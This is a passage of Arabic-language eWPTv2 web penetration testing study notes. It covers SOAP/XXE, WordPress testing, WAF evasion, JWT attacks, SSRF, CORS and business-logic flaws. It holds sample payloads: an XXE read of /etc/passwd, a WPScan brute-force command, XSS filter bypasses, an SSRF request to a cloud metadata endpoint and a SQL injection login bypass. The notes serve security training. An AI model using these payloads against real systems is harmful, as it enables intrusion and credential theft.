&lt;/message&gt;
&lt;portType name="UserServicePortType"&gt;
  &lt;operation name="GetUser"&gt;
    &lt;input message="tns:GetUserRequest"/&gt;
    &lt;output message="tns:GetUserResponse"/&gt;
  &lt;/operation&gt;
&lt;/portType&gt;</code></pre>
    <h3>اختبار أمان خدمات الويب</h3>
    <p>خدمات الويب ممكن تكون هدف لهجمات كتير، زي هجمات انتحال الهوية، التلاعب بالرسائل، والاعتماد على معلومات غير موثوقة.</p>
    <p><strong>تقنيات الاختبار:</strong></p>
    <ul>
      <li><strong>اختبار الضعف:</strong> تحديد الثغرات المعروفة في الخدمة</li>
      <li><strong>اختبار الولوج:</strong> التأكد إن المستخدمين المصرح لهم بس هما اللي يقدروا يوصلوا للوظائف المناسبة</li>
      <li><strong>تحليل التهديدات:</strong> فحص السيناريوهات المحتملة للهجمات وتقييم المخاطر</li>
    </ul>
    <p><strong>أدوات مفيدة للاختبار العملي:</strong></p>
    <ul>
      <li><strong>Postman:</strong> لبناء وإرسال طلبات REST API يدويًا وتجربة قيم مختلفة</li>
      <li><strong>SoapUI:</strong> أداة متخصصة لاختبار خدمات SOAP، بتقرأ ملف WSDL وتبني الطلبات تلقائيًا</li>
    </ul>
    <h3>اختبار أمان خدمات SOAP</h3>
    <p>SOAP بتعتمد على XML، وده بيخليها عرضة لهجمات زي XML Injection وXXE (XML External Entity).</p>
    <div class="callout warning">
      <span class="label">مثال بسيط على هجوم XXE</span>
      <pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;userInfo&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/userInfo&gt;</code></pre>
      <p>لو الـ Parser بتاع XML مش معطل فيه معالجة الـ External Entities، ممكن يرجع محتوى الملف <code>/etc/passwd</code> جوا الرد.</p>
    </div>
    <p><strong>استراتيجيات الاختبار:</strong></p>
    <ul>
      <li><strong>تحليل الرسائل:</strong> التأكد إن رسائل SOAP مشفرة وآمنة</li>
      <li><strong>فحص WSDL:</strong> التأكد إن ملفات WSDL مش بتعرض معلومات حساسة</li>
      <li><strong>اختبار التوقيع الرقمي:</strong> التأكد إن الرسائل موقّعة وبتستخدم SSL/TLS</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 9. CMS ============ -->
  <section class="stage" id="cms">
    <h2><span class="num">9</span> اختبار أنظمة إدارة المحتوى (CMS Pentesting)</h2>
    <p>السكشن ده بيغطي: منهجية اختبار CMS وWordPress، جمع المعلومات والتعداد، فحص الثغرات، هجمات المصادقة، واستغلال الإضافات.</p>
    <h3>مقدمة عن أنظمة إدارة المحتوى (CMS)</h3>
    <p>CMS هي أنظمة بتُستخدم لإنشاء وإدارة المحتوى على الإنترنت بسهولة، من غير الحاجة لكتابة كود. أمثلة: WordPress، Joomla، Drupal.</p>
    <p class="dim">مزاياها: سهولة الاستخدام، قوالب جاهزة، وإمكانية إضافة ميزات عبر الإضافات (Plugins).</p>
    <h3>مقدمة في اختبار أمان CMS</h3>
    <p>
      CMS هدف شائع للهجمات، لأن مواقع كتيرة جدًا بتستخدمها. الهجمات الممكنة تشمل SQL Injection، XSS، ورفع الملفات
      الضارة. أهمية الاختبار هنا هي اكتشاف الثغرات قبل ما المهاجمين يستغلوها.
    </p>
    <h3>منهجية اختبار أمان CMS</h3>
    <ul>
      <li><strong>جمع المعلومات:</strong> معرفة معلومات عن النظام، الإصدارات، والإضافات المستخدمة</li>
      <li><strong>التحليل:</strong> تحليل التطبيق بحثًا عن الثغرات المعروفة</li>
      <li><strong>الاختبار:</strong> تنفيذ اختبارات الأمان زي اختبار الاختراق الفعلي</li>
      <li><strong>الإبلاغ:</strong> توثيق الثغرات واقتراح حلول</li>
    </ul>
    <h3>منهجية اختبار أمان WordPress</h3>
    <ul>
      <li><strong>تحديد الهدف:</strong> فهم إزاي WordPress بيشتغل</li>
      <li><strong>جمع المعلومات:</strong> استخدام أدوات زي WPScan لجمع معلومات عن النسخة، الإضافات، والثيمات</li>
      <li><strong>تنفيذ الاختبارات:</strong> اختبار الثغرات زي SQL Injection وXSS</li>
    </ul>
    <h3>جمع المعلومات والتعداد في WordPress</h3>
    <ul>
      <li><strong>التعرف على النسخة:</strong> فحص رؤوس HTTP، واستخدام WPScan</li>
      <li><strong>البحث عن الإضافات:</strong> معرفة الإضافات المثبتة وإصداراتها</li>
      <li><strong>التحقق من المستخدمين:</strong> استخدام تقنيات "User Enumeration" للحصول على معلومات عن المستخدمين</li>
    </ul>
    <p><strong>تثبيت واستخدام WPScan:</strong></p>
    <pre><code>sudo apt install wpscan</code></pre>
    <pre><code>wpscan --url http://example.com --enumerate u,vp,vt</code></pre>
    <p><strong>أهم فلاجز WPScan:</strong></p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الفلاج</th><th>الوظيفة</th></tr></thead>
        <tbody>
          <tr><td><code>--enumerate u</code></td><td>استخراج أسماء المستخدمين</td></tr>
          <tr><td><code>--enumerate vp</code></td><td>استخراج الإضافات القابلة للاستغلال (Vulnerable Plugins)</td></tr>
          <tr><td><code>--enumerate vt</code></td><td>استخراج الثيمات القابلة للاستغلال (Vulnerable Themes)</td></tr>
          <tr><td><code>--api-token &lt;token&gt;</code></td><td>استخدام الـ WPVulnDB API لنتائج أدق وأحدث</td></tr>
          <tr><td><code>--passwords &lt;wordlist&gt;</code></td><td>تجربة Brute Force على المستخدمين المكتشفين</td></tr>
        </tbody>
      </table>
    </div>
    <h3>فحص الثغرات في WordPress</h3>
    <ul>
      <li><strong>WPScan:</strong> لفحص الثغرات المعروفة في النسخة، الإضافات، والثيمات</li>
      <li><strong>Nessus:</strong> لفحص أمان النظام بشكل عام</li>
    </ul>
    <p class="dim">تحليل النتائج: تحديد الثغرات ذات الأولوية وتوثيقها.</p>
    <h3>هجمات المصادقة في WordPress</h3>
    <ul>
      <li><strong>Brute Force:</strong> محاولة تخمين كلمات المرور</li>
      <li><strong>Credential Stuffing:</strong> استخدام بيانات تسجيل دخول مسربة من مواقع تانية</li>
    </ul>
    <p class="dim">الحماية: تطبيق مصادقة ثنائية (2FA)، واستخدام كلمات مرور قوية.</p>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <pre><code>wpscan --url http://example.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt</code></pre>
    </div>
    <h3>استغلال إضافات WordPress</h3>
    <p><strong>كيف يتم الاستغلال؟</strong></p>
    <ul>
      <li><strong>ثغرات XSS:</strong> لو الإضافة مش بتتأكد من صحة المدخلات</li>
      <li><strong>SQL Injection:</strong> في حالة ضعف الأمان في استعلامات قاعدة البيانات</li>
    </ul>
    <p class="dim">أدوات للتحليل: Burp Suite وOWASP ZAP.</p>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        لقيت WPScan بيقول إن الموقع شغال عليه إضافة <code>contact-form-x</code> نسخة قديمة، وفيها ثغرة SQL Injection
        معروفة (CVE محدد). دورت على الـ Exploit المتاح ليها على Exploit-DB أو استخدمتها مباشرة عبر Metasploit لو
        متاح موديول جاهز.
      </p>
    </div>
    <h3>اختبار الاختراق الأسود (Black-Box) في WordPress</h3>
    <p>الاختبار الأسود يعني إنك تبدأ بدون معرفة مسبقة بالبنية الداخلية للنظام.</p>
    <p><strong>الخطوات:</strong></p>
    <ul>
      <li><strong>جمع المعلومات:</strong> استخدام أدوات زي Google Dorking وWPScan</li>
      <li><strong>تنفيذ الهجمات:</strong> استغلال الثغرات المعروفة أو تنفيذ هجمات SQL</li>
      <li><strong>توثيق النتائج:</strong> تسجيل الثغرات وأي معلومات حساسة حصلت عليها</li>
    </ul>
    <h3>نصائح لتحصين WordPress (مفيدة تحطها في تقريرك كتوصيات)</h3>
    <ul>
      <li>تحديث النواة والإضافات والثيمات بشكل دوري</li>
      <li>حذف أي إضافات أو ثيمات غير مستخدمة بدل تعطيلها فقط</li>
      <li>إخفاء رقم نسخة WordPress من الكود المصدري الظاهر للعامة</li>
      <li>تفعيل مصادقة ثنائية للحسابات الإدارية</li>
      <li>تقييد محاولات تسجيل الدخول (Rate Limiting) على <code>wp-login.php</code></li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 10. ENCODING ============ -->
  <section class="stage" id="encoding">
    <h2><span class="num">10</span> الترميز والتصفية (Encoding &amp; Filtering)</h2>
    <p>السكشن ده بيغطي: HTML Encoding، URL Encoding، Base64، تجاوز المرشحات على جانب العميل والخادم، وتجاوز الـ WAFs والـ IDS.</p>
    <h3>مقدمة</h3>
    <ul>
      <li><strong>الترميز (Encoding):</strong> تحويل البيانات لصيغة أخرى لتسهيل نقلها أو تخزينها، ولتجنب الفهم غير المقصود للبيانات</li>
      <li><strong>التصفية (Filtering):</strong> يُستخدم للتحقق من المدخلات ومنع هجمات زي XSS وSQL Injection</li>
      <li><strong>التجنب (Evasion):</strong> تقنيات يستخدمها المهاجمون لتجاوز أنظمة الأمان (زي WAF) بأساليب غير متوقعة</li>
    </ul>
    <h3>ترميز HTML</h3>
    <p>
      يُستخدم لترميز الحروف الخاصة في HTML (زي <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>) إلى رموزها
      المعروفة (زي <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code>) لمنع تنفيذ أكواد JavaScript
      الضارة.
    </p>
    <p class="dim">مثال: تحويل النص <code>&lt;script&gt;</code> إلى <code>&amp;lt;script&amp;gt;</code> ليظهر كنص عادي من غير تنفيذ.</p>
    <h3>ترميز URL</h3>
    <p>يُستخدم لتحويل الأحرف غير الصالحة في URL لصيغة صالحة، عن طريق استبدال الأحرف غير المتوافقة برموز تمثلها باستخدام %.</p>
    <p class="dim">مثال: تحويل الفراغ لـ <code>%20</code>، أو رمز # لـ <code>%23</code>.</p>
    <h3>ترميز Base64</h3>
    <p>يُستخدم لتحويل البيانات الثنائية لسلسلة نصية من 64 رمز (A-Z, a-z, 0-9, +, /)، وبيُستخدم بشكل شائع في نقل البيانات عبر HTTP.</p>
    <pre><code>echo -n "Hello" | base64
# SGVsbG8=</code></pre>
    <h3>تجاوز المرشحات على جانب العميل (Client-Side)</h3>
    <ul>
      <li>استخدام JavaScript لإدخال بيانات ضارة مباشرة على جانب العميل</li>
      <li>استخدام HTML Encoding لإخفاء الأكواد عن أعين المدقق العادي</li>
      <li>تعديل الطلب مباشرة عن طريق بروكسي زي Burp بعد ما يتجاوز الفحص اللي بيحصل في المتصفح أصلًا</li>
    </ul>
    <h3>تجاوز المرشحات على جانب الخادم (Server-Side)</h3>
    <ul>
      <li>استغلال نقاط الضعف في كيفية معالجة الخادم للبيانات</li>
      <li>استخدام SQL Injection لتجاوز تصفية المدخلات</li>
      <li>إدخال رموز ترميز غير متوقعة ممكن تتعالج بشكل غلط</li>
    </ul>
    <h3>جدران حماية تطبيقات الويب (WAF) والوكلاء (Proxies)</h3>
    <p>WAF هي أنظمة تُستخدم لحماية تطبيقات الويب من هجمات معروفة زي XSS وSQL Injection. الوكلاء (Proxies) بيشتغلوا كوسيط بين المستخدم والخادم.</p>
    <p class="dim">وظائفها: مراقبة وتحليل حركة البيانات، ومنع الطلبات الضارة بناءً على أنماط معروفة (Signatures).</p>
    <h3>تقنيات تجاوز WAFs والوكلاء والـ IDS</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>التقنية</th><th>مثال</th></tr></thead>
        <tbody>
          <tr><td>تغيير حالة الأحرف (Case Manipulation)</td><td><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></td></tr>
          <tr><td>استخدام Payload بديل بنفس التأثير</td><td><code>&lt;img src=x onerror=alert(1)&gt;</code> بدل <code>&lt;script&gt;</code></td></tr>
          <tr><td>ترميز مضاعف (Double Encoding)</td><td>ترميز الـ Payload بـ URL Encoding مرتين متتاليتين</td></tr>
          <tr><td>التعليقات الوهمية داخل SQL</td><td><code>UNI/**/ON SEL/**/ECT</code> لتقسيم الكلمات المحظورة</td></tr>
          <tr><td>تقسيم الـ Payload على أكتر من باراميتر</td><td>تمرير جزء من الهجوم في كل حقل والاعتماد على تجميعهم لاحقًا في الكود</td></tr>
        </tbody>
      </table>
    </div>
    <div class="callout example">
      <span class="label">مثال عملي على تجاوز فلتر XSS بسيط</span>
      <p>لو الفلتر بيرفض <code>&lt;script&gt;</code> بالظبط، ممكن تجرب:</p>
      <pre><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;</code></pre>
      <p>
        كل شكل من دول بيحقق نفس الهدف بطريقة مختلفة، وده بيوضح ليه الاعتماد على فلتر بسيط بيبحث عن كلمة واحدة
        بالظبط مش كافي أبدًا كحماية حقيقية. الحماية الحقيقية لازم تعتمد على تصفية بناءً على القواعد النحوية
        (Context-Aware Filtering) مش على قوائم كلمات محظورة بسيطة.
      </p>
    </div>
  </section>
  <hr class="section-divider">
  <!-- ============ 11. API & JWT ============ -->
  <section class="stage" id="api-jwt">
    <h2><span class="num">11</span> أمان الـ API و JWT</h2>
    <p>كتير من التطبيقات الحديثة بقت شغالة بـ APIs في الخلفية (خصوصًا Single Page Applications)، فاختبار أمان الـ API بقى جزء أساسي مش اختياري.</p>
    <h3>أنواع الـ API الشائعة</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>النوع</th><th>الخصائص</th></tr></thead>
        <tbody>
          <tr><td>REST</td><td>يعتمد على HTTP Methods، بيستخدم JSON غالبًا، الأشهر حاليًا</td></tr>
          <tr><td>SOAP</td><td>يعتمد على XML، أكتر رسمية وتعقيدًا، شائع في الأنظمة المصرفية والحكومية</td></tr>
          <tr><td>GraphQL</td><td>استعلام واحد مرن بدل نقاط نهاية متعددة، بيحتاج اختبار مختلف شوية</td></tr>
        </tbody>
      </table>
    </div>
    <h3>أهم نقاط الاختبار في REST APIs</h3>
    <ul>
      <li><strong>Broken Object Level Authorization (BOLA/IDOR):</strong> لو غيرت رقم الـ ID في الطلب وقدرت توصل لبيانات مستخدم تاني</li>
      <li><strong>Excessive Data Exposure:</strong> الـ API بيرجع بيانات أكتر من اللي التطبيق محتاجها فعليًا (زي إرجاع الباسورد المشفر مع بيانات المستخدم)</li>
      <li><strong>Lack of Rate Limiting:</strong> إمكانية إرسال آلاف الطلبات بدون أي قيد</li>
      <li><strong>Mass Assignment:</strong> إمكانية تعديل حقول مش مفروض المستخدم العادي يعدلها (زي <code>role</code> أو <code>isAdmin</code>) عن طريق إضافتها للـ JSON المرسل</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي على IDOR في API</span>
      <pre><code>GET /api/users/1042/invoices</code></pre>
      <p>لو غيّرت الرقم لـ <code>1041</code> وقدرت تشوف فواتير مستخدم تاني من غير أي تحقق من الصلاحية، دي ثغرة IDOR واضحة.</p>
    </div>
    <h3>فحص واستكشاف الـ API</h3>
    <ul>
      <li><strong>Swagger/OpenAPI:</strong> لو التطبيق فيه ملف <code>swagger.json</code> أو <code>/api-docs</code> متاح، ده بيدّيك توثيق كامل لكل نقاط النهاية المتاحة من غير أي مجهود تخمين</li>
      <li><strong>ffuf / Gobuster:</strong> لاكتشاف نقاط نهاية غير موثقة</li>
    </ul>
    <pre><code>ffuf -u http://example.com/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt</code></pre>
    <h3>JWT (JSON Web Tokens) — الهجمات الشائعة</h3>
    <p>الـ JWT بقى الطريقة الأشهر لإدارة الجلسات في الـ APIs، وبيتكون من 3 أجزاء مفصولة بنقطة: <code>Header.Payload.Signature</code>، وكل جزء مشفّر بـ Base64Url.</p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>نوع الهجوم</th><th>الفكرة</th></tr></thead>
        <tbody>
          <tr><td>None Algorithm Attack</td><td>تغيير خوارزمية التوقيع في الـ Header لـ <code>none</code> وحذف التوقيع بالكامل — لو السيرفر مش بيتحقق كويس، بيقبل التوكن</td></tr>
          <tr><td>Algorithm Confusion (RS256 → HS256)</td><td>تحويل خوارزمية التوقيع من غير متماثلة لمتماثلة، واستخدام المفتاح العام (اللي عادةً متاح للعامة) كمفتاح توقيع سري</td></tr>
          <tr><td>Weak Secret Brute-Forcing</td><td>لو الـ Secret Key ضعيف، ممكن تكسره بأدوات زي hashcat أو jwt_tool</td></tr>
          <tr><td>Signature Stripping</td><td>حذف التوقيع بالكامل وترك نقطة فاضية في الآخر</td></tr>
        </tbody>
      </table>
    </div>
    <p><strong>أداة مخصصة:</strong> <code>jwt_tool</code> بتساعدك تحلل وتهاجم الـ JWT tokens بشكل آلي:</p>
    <pre><code>python3 jwt_tool.py &lt;TOKEN&gt; -T</code></pre>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        فحصت توكن JWT بموقع jwt.io ولقيت الـ Header بيقول <code>"alg": "HS256"</code>. جربت أغيّرها لـ
        <code>"alg": "none"</code> وأحذف التوقيع بالكامل، وبعتت الطلب — لو السيرفر قبل التوكن المعدل من غير أي رفض،
        يبقى فيه ثغرة None Algorithm خطيرة بتسمح بتزوير أي صلاحيات.
      </p>
    </div>
  </section>
  <hr class="section-divider">
  <!-- ============ 12. SSRF ETC ============ -->
  <section class="stage" id="ssrf-cors">
    <h2><span class="num">12</span> SSRF وInsecure Deserialization وCORS وClickjacking</h2>
    <p>السكشن ده بيغطي مجموعة ثغرات مهمة موجودة في OWASP Top 10 ومش بتتغطى دايمًا في السكاشن التقليدية، لكنها بتظهر كتير في التطبيقات الحديثة.</p>
    <h3>Server-Side Request Forgery (SSRF)</h3>
    <p>بتحصل لما تقدر تخلي السيرفر نفسه يبعت طلب لمكان إنت بتحدده، بدل ما يبعت للمكان المفروض بس.</p>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>لو فيه خاصية "استيراد صورة من رابط" وبتاخد باراميتر <code>url</code>:</p>
      <pre><code>POST /import-image
url=http://internal-server:8080/admin</code></pre>
      <p>
        لو السيرفر نفذ الطلب ده، تقدر تستخدمه للوصول لخدمات داخلية مش مفروض تكون متاحة من برة الشبكة أصلًا — زي
        لوحات إدارة داخلية أو حتى Cloud Metadata Endpoints:
      </p>
      <pre><code>url=http://169.254.169.254/latest/meta-data/</code></pre>
      <p>
        الرابط ده بالذات بيُستخدم كتير في اختراقات السحابة (AWS/GCP/Azure) لسرقة بيانات اعتماد مؤقتة (Temporary
        Credentials) خاصة بالسيرفر نفسه.
      </p>
    </div>
    <h3>Insecure Deserialization</h3>
    <p>
      بتحصل لما التطبيق بياخد بيانات معقدة (Objects) من مصدر غير موثوق (زي كوكيز أو باراميتر) ويعمل لها Deserialize
      من غير تحقق، وده ممكن يوصل لتنفيذ كود عن بعد لو اللغة المستخدمة (زي PHP، Java، Python Pickle) بتسمح بده.
    </p>
    <p class="dim">
      علامة شائعة: لو لقيت كوكيز أو باراميتر شكله زي Base64 وبعد فكه بيظهر بداية بحروف زي <code>O:</code> (في PHP) أو
      <code>rO0</code> (في Java)، ده مؤشر قوي على وجود Serialized Object.
    </p>
    <h3>CORS Misconfiguration</h3>
    <p>CORS (Cross-Origin Resource Sharing) هو الآلية اللي المتصفح بيستخدمها عشان يقرر لو موقع تاني يقدر يطلب بيانات من الموقع الحالي ولا لأ.</p>
    <p><strong>الإعداد الخطير الشائع:</strong></p>
    <pre><code>Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true</code></pre>
    <div class="callout warning">
      <span class="label">الإعداد الأخطر عمليًا</span>
      <p>الجمع بين الاثنين اللي فوق غير منطقي أصلًا (المتصفحات بترفضه)، لكن الأخطر عمليًا هو لما السيرفر بيعكس أي Origin المرسل في الطلب على إنه مسموح:</p>
      <pre><code>Origin: http://evil.com
→ Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true</code></pre>
      <p>هنا أي موقع خبيث يقدر يعمل طلب بالنيابة عن الضحية ويقرأ الرد، لأن المتصفح هيبعت الكوكيز تلقائيًا معاه.</p>
    </div>
    <h3>Clickjacking</h3>
    <p>
      بتحصل لما موقع خبيث يحمّل الموقع الحقيقي جوا <code>&lt;iframe&gt;</code> شفاف، ويخدع المستخدم إنه يدوس على
      زرار شكله عادي، بس هو فعليًا بيدوس على زرار حقيقي في الموقع المستهدف (زي "حذف الحساب" أو "تحويل أموال").
    </p>
    <p><strong>التحقق منها:</strong></p>
    <pre><code>&lt;iframe src="http://example.com" width="500" height="500"&gt;&lt;/iframe&gt;</code></pre>
    <p>
      لو الصفحة اتحملت عادي جوا الـ iframe من غير أي مشكلة، الموقع عرضة لـ Clickjacking. الحماية الأساسية هي رأس
      <code>X-Frame-Options: DENY</code> أو <code>Content-Security-Policy: frame-ancestors 'none'</code>.
    </p>
  </section>
  <hr class="section-divider">
  <!-- ============ 13. BUSINESS LOGIC ============ -->
  <section class="stage" id="business-logic">
    <h2><span class="num">13</span> منطق العمل والـ Rate Limiting (Business Logic &amp; Rate Limiting)</h2>
    <p>ده النوع اللي مفيش أداة آلية بتلاقيه بسهولة، لأنه مش عن كود فيه خطأ تقني، لكن عن منطق العمل نفسه فيه ثغرة.</p>
    <h3>أمثلة شائعة على ثغرات منطق العمل</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>المثال</th><th>الشرح</th></tr></thead>
        <tbody>
          <tr><td>تعديل السعر في طلب الشراء</td><td>لو السعر بيتبعت من المتصفح للسيرفر بدل ما يتحسب من السيرفر نفسه، ممكن تعدله لأي رقم</td></tr>
          <tr><td>استخدام كوبون خصم أكتر من مرة</td><td>لو مفيش تحقق من إن الكوبون اتستخدم قبل كده لنفس الحساب</td></tr>
          <tr><td>تجاوز خطوات التحقق (Race Condition)</td><td>إرسال نفس الطلب أكتر من مرة في نفس الوقت بالظبط، عشان تستغل الفرق الزمني قبل ما السيرفر يحدّث الحالة</td></tr>
          <tr><td>تغيير حالة الطلب يدويًا</td><td>زي تغيير حالة طلب من "قيد المراجعة" لـ "مقبول" عن طريق تعديل باراميتر في الطلب مباشرة</td></tr>
        </tbody>
      </table>
    </div>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>في متجر إلكتروني، لقيت إن طلب الشراء بيبعت الحقول دي:</p>
      <pre><code>{"product_id": 55, "quantity": 1, "price": 199.99}</code></pre>
      <p>
        لو عدّلت <code>price</code> لـ <code>1.00</code> وبعت الطلب، ولو السيرفر قبله من غير ما يتأكد من السعر
        الحقيقي في قاعدة البيانات، يبقى فيه ثغرة منطقية خطيرة تسمح بشراء منتجات بأي سعر تحدده أنت.
      </p>
    </div>
    <h3>اختبار الـ Rate Limiting</h3>
    <ul>
      <li>جرب تبعت نفس الطلب (زي محاولة تسجيل دخول أو استخدام كوبون) عدد كبير من المرات في وقت قصير باستخدام Burp Intruder</li>
      <li>لو مفيش أي حظر أو تأخير بعد عدد معين من المحاولات، ده بيفتح الباب لهجمات Brute Force وCredential Stuffing غير محدودة</li>
    </ul>
    <p class="dim">
      اختبار منطق العمل بيحتاج منك فهم عميق لوظيفة التطبيق نفسه قبل أي حاجة تقنية — مينفعش تشغل أداة آلية وتستنى
      تطلعلك النتيجة، لازم تفكر زي المستخدم اللي بيحاول يلعب بالنظام.
    </p>
  </section>
  <hr class="section-divider">
  <!-- ============ APPENDIX A: QUICK REFERENCE ============ -->
  <section class="stage" id="appendix-reference">
    <h2><span class="num">14</span> ملحق: مرجع سريع</h2>
    <h3>المنافذ والخدمات الشائعة في اختبار الويب</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>المنفذ</th><th>الخدمة</th></tr></thead>
        <tbody>
          <tr><td>80</td><td>HTTP</td></tr>
          <tr><td>443</td><td>HTTPS</td></tr>
          <tr><td>8080 / 8000 / 8443</td><td>خدمات ويب بديلة أو بروكسيات (زي Burp الافتراضي)</td></tr>
          <tr><td>3000</td><td>تطبيقات تطوير شائعة (Node.js، React Dev Server)</td></tr>
          <tr><td>5000</td><td>Flask ومنصات تطوير API شائعة</td></tr>
          <tr><td>9000</td><td>لوحات إدارة أو خدمات PHP-FPM أحيانًا</td></tr>
        </tbody>
      </table>
    </div>
    <h3>أكواد استجابة HTTP المهمة أثناء الاختبار</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الكود</th><th>المعنى</th><th>ليه مهم في البينتيست</th></tr></thead>
        <tbody>
          <tr><td>200</td><td>نجاح الطلب</td><td>تأكيد إن المسار أو المورد موجود وشغال</td></tr>
          <tr><td>301/302</td><td>إعادة توجيه</td><td>ممكن يكشف مسارات داخلية أو نطاقات فرعية</td></tr>
          <tr><td>401</td><td>غير مصرح (محتاج مصادقة)</td><td>يوضح إن المورد محمي، مش غير موجود</td></tr>
          <tr><td>403</td><td>ممنوع</td><td>المورد موجود لكن مرفوض الوصول له</td></tr>
          <tr><td>500</td><td>خطأ داخلي في السيرفر</td><td>مؤشر قوي على وجود ثغرة (خصوصًا مع Error-Based SQLi)</td></tr>
        </tbody>
      </table>
    </div>
    <h3>مصادر Wordlists الأساسية (متوفرة في مجموعة SecLists)</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الاستخدام</th><th>المسار الشائع</th></tr></thead>
        <tbody>
          <tr><td>اكتشاف مجلدات وملفات</td><td><code>/usr/share/wordlists/dirb/common.txt</code></td></tr>
          <tr><td>اكتشاف نطاقات فرعية</td><td><code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td></tr>
          <tr><td>كلمات مرور شائعة</td><td><code>/usr/share/wordlists/rockyou.txt</code></td></tr>
          <tr><td>Fuzzing باراميترات</td><td><code>/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></td></tr>
        </tbody>
      </table>
    </div>
    <h3>أدوات Developer Tools في المتصفح — استخدام سريع جدًا</h3>
    <ul>
      <li><strong>Network Tab:</strong> لمراقبة كل الطلبات والاستجابات بدون الحاجة لبروكسي في الفحص السريع</li>
      <li><strong>Application Tab:</strong> لمراجعة الكوكيز مباشرة وخصائصها (HttpOnly, Secure, SameSite)</li>
      <li><strong>Console:</strong> لتجربة أكواد JavaScript يدويًا والتحقق من ثغرات DOM-Based XSS بسرعة</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ APPENDIX B: REPORT TEMPLATE ============ -->
  <section class="stage" id="appendix-report">
    <h2><span class="num">15</span> ملحق: قالب كتابة تقرير اختبار اختراق</h2>
    <p>كل ثغرة تكتشفها لازم توثقها بشكل موحد عشان التقرير يبقى مفيد لفريق التطوير. القالب المقترح:</p>
    <pre><code>## اسم الثغرة
مثال: SQL Injection في نموذج تسجيل الدخول
## الخطورة (Severity)
Critical / High / Medium / Low — ويفضل رقم CVSS لو ممكن
## الوصف
شرح مختصر للثغرة وسياقها في التطبيق
## خطوات إعادة الإنتاج (Steps to Reproduce)
1. اذهب إلى /login
2. أدخل في حقل username: admin' OR '1'='1' --
3. لاحظ الدخول بدون كلمة مرور صحيحة
## الأثر (Impact)
ما الذي يستطيع المهاجم فعله فعليًا بعد استغلال هذه الثغرة
## دليل الإثبات (Proof of Concept)
لقطة شاشة أو طلب/رد HTTP كامل يوضح الاستغلال
## التوصية (Remediation)
استخدام Prepared Statements بدل الاستعلامات الديناميكية
## المراجع (References)
روابط OWASP أو CWE المرتبطة بنوع الثغرة</code></pre>
    <div class="callout">
      <span class="label">نصيحة أخيرة</span>
      <p>
        التقرير الجيد بيبقى مفهوم حتى لحد مش بينتستر — يعني مطور أو مدير منتج يقدر يقرأ قسم "الوصف" و"الأثر" ويفهم
        خطورة المشكلة، حتى لو مفهمش تفاصيل "خطوات إعادة الإنتاج" التقنية بالكامل.
      </p>
    </div>
  </section>
  <hr class="section-divider">
  <section class="stage" style="margin-bottom: 0;">
    <h2 style="border-bottom:none; margin-bottom:12px;">الخلاصة</h2>
    <p>
      كدا غطينا الكورس بالكامل — من مقدمة عن اختبار أمان تطبيقات الويب، مرورًا بجمع المعلومات، البروكسيات، أخطر
      الثغرات (XSS، SQL Injection)، الهجمات الشائعة على المصادقة والجلسات، ثغرات الملفات والمسارات، أمان خدمات
      الويب، اختبار أمان الـ CMS وWordPress بالتفصيل، الترميز والتصفية وتقنيات التجاوز، وصولًا لأمان الـ APIs
      والـ JWT، الثغرات الأحدث زي SSRF وCORS Misconfiguration وClickjacking، وأخيرًا اختبار منطق العمل (Business
      Logic) اللي محدش بيديله حقه غالبًا رغم خطورته.
    </p>
  </section>
  <footer>
    <div>نوتس eWPTv2 — للمراجعة والاستخدام الشخصي فقط، استخدم كل الأدوات المذكورة داخل نطاق قانوني ومصرّح به فقط.</div>
    <a class="back-to-top" href="#top">⬆ رجوع لأعلى الصفحة</a>
  </footer>
</div>
</div>
